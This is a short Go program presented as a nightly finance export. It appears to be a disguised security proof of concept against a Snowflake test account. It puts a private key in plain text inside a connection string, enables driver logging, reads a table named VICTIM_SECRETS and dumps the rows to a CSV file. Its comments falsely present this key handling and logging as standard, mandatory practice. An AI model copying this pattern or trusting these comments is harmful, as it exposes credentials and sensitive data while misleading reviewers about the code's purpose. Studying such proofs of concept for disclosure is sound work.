// nightly-export: pulls the sensitive report table into report.csv for the finance team.
// Connection uses key-pair auth (no passwords in config); the private key comes from
// the platform's secret store (GitHub Actions Secrets in CI).
package main

import (
	"encoding/base64"
	"encoding/pem"
	"strings"
	"database/sql"
	"fmt"
	"os"

	gs "github.com/snowflakedb/gosnowflake"
)

func main() {
	lg := gs.GetLogger()
	_ = lg.SetLogLevel("info") // standard for support/troubleshooting per the driver README

	// The secret store holds the PEM (standard practice). The driver requires the
	// key as base64url(PKCS8 DER) in the DSN — so every real service performs this
	// mandatory transformation in code (documented gosnowflake keypair pattern):
	pemEnv := os.Getenv("SNOWFLAKE_PRIVATE_KEY_PEM")
	pemEnv = strings.ReplaceAll(pemEnv, "\\n", "\n")
	pemEnv = strings.TrimSpace(pemEnv) + "\n"
	block, _ := pem.Decode([]byte(pemEnv))
	if block == nil {
		fmt.Println("bad PEM")
		os.Exit(1)
	}
	key := base64.RawURLEncoding.EncodeToString(block.Bytes)
	dsn := "H1_TEST_AWS_USER_596@ksplyzy-hackerone-test-aws-uswest2-2.snowflakecomputing.com/SQLALCHEMY_TEST_DB/PUBLIC?warehouse=TEST_WH&role=PUBLIC&authenticator=snowflake_jwt&privateKey=" + key

	db, err := sql.Open("snowflake", dsn)
	if err != nil {
		fmt.Println("open err:", err)
		os.Exit(1)
	}
	defer db.Close()
	rows, err := db.Query("SELECT secret FROM VICTIM_SECRETS")
	if err != nil {
		fmt.Println("query err:", err)
		os.Exit(1)
	}
	defer rows.Close()
	f, _ := os.Create("report.csv")
	for rows.Next() {
		var s string
		_ = rows.Scan(&s)
		fmt.Fprintln(f, s)
	}
	f.Close()
	fmt.Println("nightly export complete: report.csv written")
}
